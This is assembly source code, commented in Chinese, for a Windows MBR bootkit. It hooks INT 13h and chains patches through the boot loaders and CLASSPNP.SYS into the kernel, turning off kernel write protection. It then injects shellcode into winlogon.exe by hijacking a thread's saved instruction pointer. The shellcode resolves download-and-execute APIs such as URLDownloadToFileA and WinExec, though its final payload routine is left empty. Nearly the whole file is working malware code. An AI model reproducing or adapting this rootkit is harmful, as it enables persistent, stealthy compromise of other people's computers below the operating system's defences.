;容易出错问题：1、模块2扇区大小，扇区位置。2、微软MBR位置。
;思路：hook int13--->hook su.com----->hook osload.exe--->hook winload.exe---->hook CLASSPNP.SYS---->hook 内核---->hook winlogo.exe的线程
;编译器用jwasm aa.asm 链接器用doslnk /tiny aa.obj
.386p                          
.model tiny  

include j:\RadASM\jwasm\Samples\ntddk.inc
include J:\RadASM\masm32\include\w2k\native.inc
;include J:\RadASM\masm32\tools\IoctlDecoder\src\wnet\ntdddisk_.inc
include J:\RadASM\jwasm\Include\w2k\ntdddisk.inc

;**************************************16位保护模式代码**************************************** 
;_main proto stdcall :qword
EVENT_ALL_ACCESS	EQU	( STANDARD_RIGHTS_REQUIRED  or  SYNCHRONIZE  or  3h )
STANDARD_RIGHTS_REQUIRED	EQU	000F0000h
SYNCHRONIZE	        EQU	00100000h
FILE_ATTRIBUTE_NORMAL	EQU	00000080h
FILE_SHARE_WRITE	EQU	00000002h
GENERIC_READ	        EQU	80000000h
PAGE_READWRITE       	EQU	04h
GENERIC_WRITE          	EQU	40000000h
SECTION_MAP_WRITE	EQU	0002h
KernelMode equ 0
NULL                    equ     0
OBJ_KERNEL_HANDLE       equ     000000200h
PAGE_EXECUTE_READWRITE  equ     40h     
MEM_COMMIT              equ     1000h   
FALSE                   equ     0
FILE_NON_DIRECTORY_FILE equ     00000040h
FILE_OPEN               equ     00000001h
FILE_SYNCHRONOUS_IO_NONALERT  equ          000000020h
FILE_SHARE_READ         equ     1h
FILE_DEVICE_DISK        equ     7h
FILE_ANY_ACCESS         equ     0h
FilePositionInformation equ     14
STANDARD_RIGHTS_REQUIRED equ    000F0000h
SYNCHRONIZE             equ     00100000h
 MUTANT_QUERY_STATE     equ     0001h
 MUTEX_ALL_ACCESS       equ  (STANDARD_RIGHTS_REQUIRED or SYNCHRONIZE or MUTANT_QUERY_STATE)


FILE_POSITION_INFORMATION STRUCT
	CurrentByteOffset	LARGE_INTEGER	<>
FILE_POSITION_INFORMATION ENDS
PFILE_POSITION_INFORMATION typedef ptr FILE_POSITION_INFORMATION


Code_Sise equ 200h  
RealCodeSize equ  CodeEnd-CodeStart 
ProtectCodeSize  equ  ProtectCodeEnd-ProtectCodeStart  
RealCode segment byte use16     
CodeStart:                     
  cli 
  xor ax,ax
  mov es,ax
  mov es:word ptr [413h],27ch     ;DOS程序申请内存空间                    
  mov ax,9f00h                    ;9f00物理内存一直被保留不用，直到osloder的关键call到内核，win7系统9f00分页后逻辑地址为804c1000h，xp为8009f000   ;分配的保留内存;es:0 -> 分配的保留内存地址
  mov es,ax
  mov ds,ax
  xor si,si
  mov word ptr ds:[si],26         
  mov ah,48h
  mov dl,80h
  int 13h                         ;获取磁盘参数，总扇区数量
  


  mov eax,ds:[si+16]
  sub eax,10;写到磁盘倒数第10扇区
  mov dword ptr cs:[7c00h+sectors],eax
  mov eax,dword ptr ds:[si+20]
  mov dword ptr cs:[7c00h+sectors+4],eax

  
  ;填写DAP
  mov ax,9e00h
  mov ds,ax
  mov eax,es:[si+16]
  sub eax,9;读取磁盘尾部倒数第10个扇区
  mov ebx,es:[si+20]
  mov byte ptr ds:[si],10h  
  mov byte ptr ds:[si+1],0
  mov word ptr ds:[si+2],6;读取扇区数量
  mov dword ptr ds:[si+4],9f000200h
  mov dword ptr ds:[si+8],eax
  mov dword ptr ds:[si+12],ebx
  mov ah,42h
  mov dl,80h
  int 13h;读取hook 内核、winload.exe osload.exe 以及su.com代码到0x9f200
  
  
  
  cld 
  xor ax,ax
  mov ds,ax                           ;
  mov si,7c00h
  xor di,di                      ;代码被拷贝到es:di处(分配的保留内存里).注意：拷贝后偏移值改变。
  mov cx,Code_Sise
  rep movsb                      ;拷贝代码到保留内存
  mov eax,ds:[13h*4]             ;安装我们的INT13h代码
  mov ds:[85h*4],eax             ;保存旧的int13向量值
  mov word ptr ds:[13h*4],INT13Hook
  mov ds:[(13h*4) + 2],es        ;设置我们的INT13h向量
  
  
  push es
  push BootOS
  retf
  
 
  
  
;**************;jmp far 0:7c00h ;引导系统   cs=es=#9f00
BootOS:
  mov ax,9e00h
  mov ds,ax
  xor si,si
  mov eax,dword ptr cs:[sectors]
  mov ebx,dword ptr cs:[sectors+4]
  mov byte ptr ds:[si],10h  
  mov byte ptr ds:[si+1],0
  mov word ptr ds:[si+2],1
  mov dword ptr ds:[si+4],00007c00h
  mov dword ptr ds:[si+8],eax
  mov dword ptr ds:[si+12],ebx
  mov ah,42h
  mov dl,80h
  int 13h;读取微软的MBR到0x7c00
  
  ;mov ax,0301h;ah=功能号，AL=扇区数
  ;mov cx,0001h;ch=柱面，cl的扇区
  ;mov dx,0080h;dh=磁头，dl=驱动器号
  ;mov bx,7c0h;es:bx 缓冲区地址
  ;mov es,bx
  ;mov bx,0
  ;int 13h;为了实体机测试恢复微软MBR，所以不必担心实体机测试失败，导致无法引导系统
  db  0eah
  dd  7c00h                       ;jmp far 0:7c00h ;引导系统
  sectors dq 0 ;磁扇区盘倒数第10个的逻辑扇区值
;****************hook int 13H
INT13Hook:
  pushf
  cmp ah, 42h					
  je  short @Int13Hook_ReadRequest
  cmp ah, 02h					
  je  short @Int13Hook_ReadRequest
  popf
  int 85h
  iret
  
@Int13Hook_ReadRequest:;判断ntldr是不是被加载到内存了
   popf
   int 85h
   pushf
   pusha
   push ds
   push es
   mov cx,6000h
   push 2000h
   pop ds
   xor si,si
   .repeat 
   	.break .if (dword ptr ds:[si]==55665266h && word ptr ds:[si+4]==03366h);搜索su是否完全被加载解密到0x20000内存，特征码66 52 push edx    66 55 push ebp     66 33 ED xor ebp,ebp
   	inc si
   	dec cx
   .until cx==0
   
   .if cx>0 ;特征码匹配到
   	sub si,6
   	push si
   	push cs
   	pop es;cs=0x9f00
   	mov di,@@@7-ProtectCodeStart+200h
   	mov cx,20
   	cld
   	rep movsb;备份原始su.com跳到osload.exe 401000处的代码,这个跳转函数具体名字我也不知道，就叫CallOsload
   	
   	pop di
   	push ds
   	pop es
   	push cs
   	pop ds
   	mov si,200h
   	mov cx,17
   	rep movsb ;hook CallOsload
   	
   	;恢复int 13
   	mov es,cx;cx=0
   	mov eax,dword ptr es:[85h*4]
   	mov dword ptr es:[13h*4],eax
   .endif
   
   pop es
   pop ds
   popa
   popf
   iret


db 512-($-CodeStart) dup(0)
CodeEnd: 
RealCode ends
;**************************************32位保护模式代码**************************************** 
;**************************************32位保护模式代码**************************************** 
;**************************************32位保护模式代码**************************************** 
;**************************************32位保护模式代码**************************************** 
;**************************************32位保护模式代码**************************************** 
;**************************************32位保护模式代码**************************************** 
ProtectCode segment byte use32 
ProtectCodeStart:
;su______________________________________________________
su:;cpu还在16位模式，所以要加66H前缀，表示32位代码运行在16位模式。
   db 66h
   pushfd
   db 66h
   pushad
   db 66h
   mov ecx,009f000h+RealCodeSize+hook_ntldr_retf
   db 66h
   push 20h
   db 66h
   push ecx
   db 66h,0cbh ;retfw hook_ntldr_retf cpu切换到32位模式
hook_ntldr_retf equ $-su
        
        mov edi,401000h;osload 代码段rva
        mov ecx,52a00h;制定osload搜索范围，防止osload升级后特征码变化，导致异常，osload.text段大小
        
        
        dec edi
     @@:inc edi
        dec ecx
        jz @@@14
        cmp dword ptr [edi],8b5bd0ffh;特征码定位osload.  特征码  FF D0 call eax     5B pop ebx     8B E3 mov esp, ebx
        jnz @B
        ;edi=osload进入winload代码的偏移 call eax。
        mov esi,9f200h+osload_code-ProtectCodeStart;hook winload资源代码的偏移。
        mov ecx, osload_code_retf- osload_code
        cld
        rep movsb
        
        mov esi,@@@7+9f200h
        .repeat 
        	lodsb
        	.if al==66h
        		mov byte ptr[esi-1],90h;由于之前拷贝过来的代码是加66前缀的，现在CPU模式为32位，所以66H nop掉，否则异常
        	.endif
        .until  al==0cbh
        
        
        
        @@@14:
        popad
        popfd
        ;hook完osload，执行su原来进入osload代码
        @@@7:
        db 20 dup (90h)
        @@@8:
;osload______________________________________________________________
osload_code: 
        pushfd
        pushad
        mov eax,009f000h+RealCodeSize+osload_code_retf-ProtectCodeStart
        jmp eax
osload_code_retf:
        mov edi,52e000h;winload.text 开始地址
        mov ecx,57000h;winload.text大小，防止异常
     @@:inc edi
        dec ecx
        jz @F
        cmp dword ptr [edi+4],5251d233h;特征码定位 winload进入内核代码     33 D2(xor edx, edx) 51(push ecx)52(push edx)                       
        jnz @B
        mov esi,009f000h+RealCodeSize+winload-ProtectCodeStart
        mov ecx,winload_code_retf-winload
        rep movsb
        
        @@:
        popad
        popfd      
        ;执行原来osload尾部代码           
    
        call eax  
;winload_________________________________________________________________         
winload:;当进入内核模块后，9F000这块物理内存会被内核分页映射，我们就无法访问了，所以内核的代码要拷贝到内核访问的到而且我们要知道这块内存地址。
        ;一开始我拷贝到内核text段的0区，后来发现内核的版本好多，有的版本0区够放我们的代码，有的不够。所以我找了个微软几年都不更新的驱动，
        ;而且0区足够，这里我用CLASSPNP.SYS。以后如果微软更新了，可以换别的       
        pushad
        pushfd
        mov eax,009f000h+RealCodeSize+winload_code_retf-ProtectCodeStart
        jmp eax
        nop
        nop
winload_code_retf:        
        mov ecx,[ecx+4*4];ecx=  _KeLoaderBlock 驱动链表
        .while ecx
        	mov edx,[ecx+12*4];驱动名字指针 UNICODE字符
        	.break .if (dword ptr [edx]==004c0043h &&  dword ptr [edx+4]==00530041H);CLASSPNP
        	mov ecx,[ecx]
        .endw
        mov eax,[ecx+6*4];BassAddress
        ;hook CLASSPNP
        mov ecx,dword ptr [eax+03ch]
        add ecx,eax;ecx=PE     
        movzx edx,word ptr [ecx+14h];SizeOfOptionHeader
        lea ecx,[ecx+edx+18h]
        mov ebx,dword ptr[ecx+8]
        mov edx,dword ptr[ecx+8+4]
        lea edi,[edx+ebx];CLASSPNP.text 段尾部0区地址rva
        add edi,eax ;
        push edi;edi=CLASSPNP.text尾部
        mov esi,009f000h+RealCodeSize+nt_code-ProtectCodeStart
        mov ecx,nt_code_end-nt_code
        rep movsb;复制内核代码到fltmgr.text尾部
        
        mov edx,eax
        mov ecx,0017000h;CLASSPNP.text段大小
     @@:inc edx
        dec ecx
        jz @@winload_end
        cmp dword ptr [edx],4589c13bh;特征码定位classpnp!ClassReadWrite+ae    cmp eax, ecx         mov [ebp+Irp], eax
        jnz @B
        
        pop edi;edi=CLASSPNP.text尾部
        sub edi,edx
        sub edi,5
        mov byte ptr [edx],0e8h
        mov dword ptr [edx+1],edi
        
        
        
        
        @@winload_end:
        popfd
        popad
        ;执行原来winload尾部代码,12字节
        mov     eax, [esp+8]
        xor     edx, edx
        push    ecx
        push    edx
        push    8
        push    eax
        retf
           

;nt______________________________________________
nt_code:  
ClassReadWrite proc stdcall 
	pushad
	pushfd
	push dword ptr[esp+24h]
	call ClassReadWrite@
	popfd
	popad
        cmp     eax, ecx
        mov     [ebp+0Ch], eax
	ret

ClassReadWrite endp   

ClassReadWrite@ proc stdcall   pNextDirective:dword
        mov eax,cr0;取消写保护,还原classPnPClassReadWrite
        btc eax,16
        mov cr0,eax
   
        mov eax, pNextDirective
        mov dword ptr [eax-5],4589c13bh
        mov byte ptr  [eax-1],0ch
   

	
	;获取内核IoStartPacket地址
	.if word ptr [eax+66h]==15ffh
		mov eax,[eax+66h+2]
		mov eax,[eax]
		and eax,0fffff000h
		add eax,1000h
		@@:
		sub eax,1000h
		cmp word ptr [eax],"ZM"
		jnz @B
	.endif
        push 11
        call @F
        db "ZwOpenFile",0
     @@:push eax
        call _GetProcAddress
        
        call @F
     @@:pop ebx
        add ebx,ZwOpenFile-$+1-5
        sub ebx,eax
        mov byte ptr [eax],0e8h  ;构造call 指令，格式为：E8 XXXXXXXX ，XXXXXXXX是相对目标地址偏移
        mov dword ptr [eax+1],ebx 
        
        
        
        mov eax,cr0;恢复写保护	
        btc eax,16
        mov cr0,eax	
        ret

ClassReadWrite@ endp

ZwOpenFile proc stdcall 
	pushad
	pushfd
	push dword ptr[esp+24h];ZwOpenFile中mov eax，25h  指令的地址作为参数
	call ZwOpenFile@
	popfd
	popad
	mov eax,0b3h	
	ret

ZwOpenFile endp

ZwOpenFile@ proc stdcall   pNextDirective:dword;驱动链表指针
        LOCAL pBuf
        LOCAL buflen
        LOCAL hProcessHandle
        LOCAL ApcState[18h]:byte
        LOCAL pProcessListHead
        LOCAL pExplorerProcess
        LOCAL Base
        LOCAL fileNameUnicodeString:UNICODE_STRING
        local objectAttributes:OBJECT_ATTRIBUTES
        LOCAL ioStatus:IO_STATUS_BLOCK
        LOCAL ntFileHandle
        LOCAL pdg:DISK_GEOMETRY_EX
        LOCAL fpi:FILE_POSITION_INFORMATION
        LOCAL PositionFileTable:LARGE_INTEGER
        LOCAL Buffer[512*2]:BYTE
        
        
        LOCAL _KeStackAttachProcess
        LOCAL _ObOpenObjectByPointer
        LOCAL _ZwAllocateVirtualMemory
        LOCAL _ZwCreateFile
        LOCAL _ZwDeviceIoControlFile
        LOCAL _ZwSetInformationFile
        LOCAL _ZwReadFile
        LOCAL _ZwWriteFile
        LOCAL _RtlInitUnicodeString
	mov ebx,fs:124h
	mov ebx,[ebx+50h]
	.if dword ptr [ebx+16ch]!="lniw" || dword ptr [ebx+16ch+4]!="nogo";winlogo.exe system权限 当前进程是winlogo.exe，执行下面代码
	        ret    
	.endif
	
	mov pExplorerProcess,ebx
         
	
         
	
	;获取内核IoStartPacket地址
	mov eax,pNextDirective
	mov ebx,cr0
	btc ebx,16
	mov cr0,ebx
	mov byte ptr [eax-5],0b8h;恢复ZwOpenFile
	mov dword ptr [eax-4],0b3h
	btc ebx,16
	mov cr0,ebx
	
	
        and eax,0fffff000h
	add eax,1000h
	@@:
	sub eax,1000h
	cmp word ptr [eax],"ZM";获取内核基础地址
	jnz @B
	mov Base,eax
                                  
                            
        push 22
        call @F
        db "ObOpenObjectByPointer",0
        @@:
        push Base
        call _GetProcAddress
        mov _ObOpenObjectByPointer,eax
        
        push 24
        call @F
        db "ZwAllocateVirtualMemory",0
        @@:
        push Base
        call _GetProcAddress
        mov _ZwAllocateVirtualMemory,eax
        
        push 21
        call @F
        db "KeStackAttachProcess",0
        @@:
        push Base
        call _GetProcAddress
        mov _KeStackAttachProcess,eax
        
        push 13
        call @F
        db "ZwCreateFile",0
        @@:
        push Base
        call _GetProcAddress
        mov _ZwCreateFile,eax
        
        push 22
        call @F
        db "ZwDeviceIoControlFile",0
        @@:
        push Base
        call _GetProcAddress
        mov _ZwDeviceIoControlFile,eax
        
        push 21
        call @F
        db "ZwSetInformationFile",0
        @@:
        push Base
        call _GetProcAddress
        mov _ZwSetInformationFile,eax
        
        push 11
        call @F
        db "ZwReadFile",0
        @@:
        push Base
        call _GetProcAddress
        mov _ZwReadFile,eax
        
        push 12
        call @F
        db "ZwWriteFile",0
        @@:
        push Base
        call _GetProcAddress
        mov _ZwWriteFile,eax
        
        push 21
        call @F
        db "RtlInitUnicodeString",0
        @@:
        push Base
        call _GetProcAddress
        mov _RtlInitUnicodeString,eax
        
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        
         

        
        
        
        
        
        
        ;invoke ObOpenObjectByPointer,pExplorerProcess,OBJ_KERNEL_HANDLE,NULL, 008h,NULL, KernelMode,addr hProcessHandle
        lea ebx,hProcessHandle
        push ebx
        push KernelMode
        push NULL
        push 8h
        push NULL
        push OBJ_KERNEL_HANDLE
        push pExplorerProcess
        call _ObOpenObjectByPointer;查询Winlogo.exe进程句柄
        
        
        ;invoke ZwAllocateVirtualMemory,hProcessHandle,addr pBuf,0,addr buflen,MEM_COMMIT,PAGE_EXECUTE_READWRITE
        mov buflen,shellcode_end-shellcode_start
        mov pBuf,0
        push PAGE_EXECUTE_READWRITE
        push MEM_COMMIT
        lea ebx,buflen
        push ebx
        push 0
        lea ebx,pBuf
        push ebx
        push hProcessHandle
        call _ZwAllocateVirtualMemory;在Winlogo.exe空间申请内存  
        
        ;invoke KeStackAttachProcess,pExplorerProcess,addr ApcState
        lea ebx,ApcState
        push ebx
        push pExplorerProcess
        call _KeStackAttachProcess;附加到Winlogo.exe空间
  
        mov eax,pExplorerProcess
        mov eax,[eax+188h];ThreadListHead
        
        ;查找 Winlogo.exe的可被调度的线程，当前还在沉睡                   
        .while eax
                mov edx,20h
                and edx,dword ptr[eax-268h+3ch]
   	        .if dword ptr  [eax-268h+128h] && edx==0;_KTHREAD.Alertable可唤醒线程 , TrapFrame =[eax-268h+128h]
   	                .break
   	        .else
   		        mov eax,[eax]
   		        
   	       .endif
   	
        .endw
   
   
        mov edx,cr0;取消写保护
        btc edx,16
        mov cr0,edx
        
        mov eax,[eax-268h+128h];TrapFrame 
        mov ebx,[eax+68h]
        call @F
     @@:pop ecx
        add ecx,offset EIP-$+1
        mov [ecx],ebx;保存EIP
        mov ecx,pBuf
        add ecx,5
        mov [eax+68h],ecx;hook TrapFrame.eip
   
        bts edx,16
        mov cr0,edx
   
        mov ecx,shellcode_end-shellcode_start
        call @F
     @@:pop esi
        add esi,shellcode_start-$+1
        mov edi,pBuf
        rep movsb;将r3要执行的代码拷贝到ZwAllocateVirtualMemory申请的内存，等待系统调度之前筛选的线程，就会执行r3的代码			
        ret

ZwOpenFile@ endp  
_GetProcAddress proc stdcall  uses edi esi ebx ecx edx  Base:dword,lpStr:dword,StrSize:dword

   
   mov edi,Base
   mov eax,[edi+3ch];pe header           
   mov edx,dword ptr[edi+eax+78h]           
   add edx,edi           
   mov ecx,[edx+18h];number of functions           
   mov ebx,[edx+20h]           
   add ebx,edi;AddressOfName
   
   search2:           
   dec ecx  
   push ecx         
   mov esi,[ebx+ecx*4]           
   add esi,Base;
   mov edi,lpStr
   mov ecx,StrSize
   repe cmpsb
   pop ecx
   jne search2 
   mov edi,Base  
   mov ebx,[edx+24h]           
   add ebx,edi;indexaddress           
   mov cx,[ebx+ecx*2]           
   mov ebx,[edx+1ch]           
   add ebx,edi           
   mov eax,[ebx+ecx*4] ;     ebx+ecx*4=  pZwCreateFile   
   add eax,edi;ZwCreateFile=eax
   ret
_GetProcAddress endp 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;R3shellcode;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
shellcode_start:
        EIP dd ?
        nop

        pushad
        pushfd 
        xor ecx,ecx            
        mov esi,fs:30h            
        mov esi, [esi + 0Ch];            
        mov esi, [esi + 1Ch];
        next_module1:            
        mov ebp, [esi + 08h];            
        mov edi, [esi + 20h];            
        mov esi, [esi];            
        cmp [edi + 12*2],cl              
        jne next_module1            
        mov edi,ebp;BaseAddr of Kernel32.dll
                          
             
        sub esp,200           
        mov ebp,esp;           
        mov eax,[edi+3ch];pe header           
        mov edx,dword ptr[edi+eax+78h]           
        add edx,edi           
        mov ecx,[edx+18h];number of functions           
        mov ebx,[edx+20h]           
        add ebx,edi;AddressOfName
        search1:           
        dec ecx           
        mov esi,[ebx+ecx*4]           
        add esi,edi;           
        mov eax,50746547h;PteG("GetP")           
        cmp [esi],eax           
        jne search1           
        mov eax,41636f72h;Acor("rocA")           
        cmp [esi+4],eax           
        jne search1           
        mov ebx,[edx+24h]           
        add ebx,edi;indexaddress           
        mov cx,[ebx+ecx*2]           
        mov ebx,[edx+1ch]           
        add ebx,edi           
        mov eax,[ebx+ecx*4]           
        add eax,edi           
        mov [ebp+76],eax;将GetProcAddress地址存在ebp+76中
        
        
        push 0;           
        push DWORD PTR 41797261h;Ayra("aryA")           
        push DWORD PTR 7262694ch;rbiL("Libr")           
        push DWORD PTR 64616f4ch;daoL("Load")           
        push esp           
        push edi           
        call dword ptr [ebp+76]
        add esp,16
        add esp,100 
        ;EAX为loadlibrary，ebx为GetProcAddress          
        mov[ebp+80],eax;将LoadLibraryA地址存在ebp+80中
        mov ebx,[ebp+76]
        nop 
        
        
        
        ;要用的API全部放在栈里面，注意栈平衡，8个DWORD——————————————————————
        push ebp
        mov ebp,esp
        sub esp,200
        mov [ebp-4],eax;EAX为loadlibrary，
        mov [ebp-8],ebx;ebx为GetProcAddress       
        mov [ebp-12],edi;kernel32基址
        
        call @F
        db "CreateThread",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-16],eax
        
        call @F
        db "CreateFileA",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-20],eax
        
        call @F
        db "GetFileSize",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-24],eax
        
        call @F
        db "ntdll.dll",0
        @@:
        call dword ptr [ebp-4]
        mov [ebp-28],eax ;-----------------ntdll.dll
        
        call @F
        db "RtlMoveMemory",0
        @@:
        push dword ptr [ebp-28]
        call dword ptr [ebp-8]
        mov [ebp-32],eax
        
       
        
        call @F
        db "VirtualFree",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-36],eax  
        call @F
        
        db "VirtualAlloc",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-40],eax  
        
        
        
        call @F
        db "_lread",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-44],eax 
        
        
        call @F
        db "user32.dll",0
        @@:
        call dword ptr [ebp-4]
        mov [ebp-48],eax ;-----------------user32.dll
        
        
        
        
        call @F
        db "MessageBoxA",0
        @@:
        push dword ptr [ebp-48]
        call dword ptr [ebp-8]
        mov [ebp-52],eax 
        
        
        
        
        
        call @F
        db "wsprintfA",0
        @@:
        push dword ptr [ebp-48]
        call dword ptr [ebp-8]
        mov [ebp-56],eax
        
        call @F
        db "CopyFileA",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-60],eax 
        
        call @F
        db "Sleep",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-64],eax 
        
        call @F
        db "OpenMutexA",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-68],eax 
        
        call @F
        db "FindFirstFileA",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-72],eax 
        
        call @F
        db "WinExec",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-76],eax 
        
        call @F
        db "urlmon.dll",0
        @@:
        call dword ptr [ebp-4]
        mov [ebp-80],eax ;-----------------urlmon.dll
        
        call @F
        db "URLDownloadToFileA",0
        @@:
        push dword ptr [ebp-80]
        call dword ptr [ebp-8]
        mov [ebp-84],eax 
        
        call @F
        db "CreateFileMappingA",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-88],eax 
        
        
        call @F
        db "MapViewOfFile",0
        @@:
        push dword ptr [ebp-12]
        call dword ptr [ebp-8]
        mov [ebp-92],eax 
        
        
        
        CALL @F 
     @@:pop eax
        add eax,offset fThread-$+1
        .if dword ptr [eax]==0
                mov dword ptr [eax],1
                CALL @F 
             @@:pop eax
                add eax,offset lpThreadId-$+1
                push eax;addr lpThreadId
                push 0
                push 0
                CALL @F 
             @@:pop eax
                sub eax,$-offset shellcode_start-1-5
                push eax
                push 0
                push 0
                call dword ptr[ebp-16]
                
                ;;invoke CreateThread,0,0,offset shellcode_start+5,0,0,addr lpThreadId
                add esp,130h
                call @F
             @@:pop eax
                sub eax,$-1-offset EIP
                mov eax,[eax]
                mov [esp-4],eax
        
                popfd
                popad
        
        
                jmp dword ptr[esp-28h];跳到原来线程的eip
        .endif 
         
        push ebp
        CALL @F 
     @@:pop eax
        add eax,offset RD_XXXX-$+1 
        call eax  ;invoke RD_XXXX ,ebp
        ;invoke Sleep,5265C00h  睡眠24小时
        push 80000000h
        call dword ptr [ebp-64]
        
       
        
        fThread dd 0
        lpThreadId dd 0
        
RD_XXXX:  
RD_XXXX1 proc stdcall api:dword
        LOCAL lpFindFileData[150h]:byte
        LOCAL lpOut[100]:byte

       
        
	ret

RD_XXXX1 endp  

        
shellcode_end:                  
ProtectCodeEnd:  
                 
nt_code_end:        
ProtectCode ends 
   

        
end CodeStart 
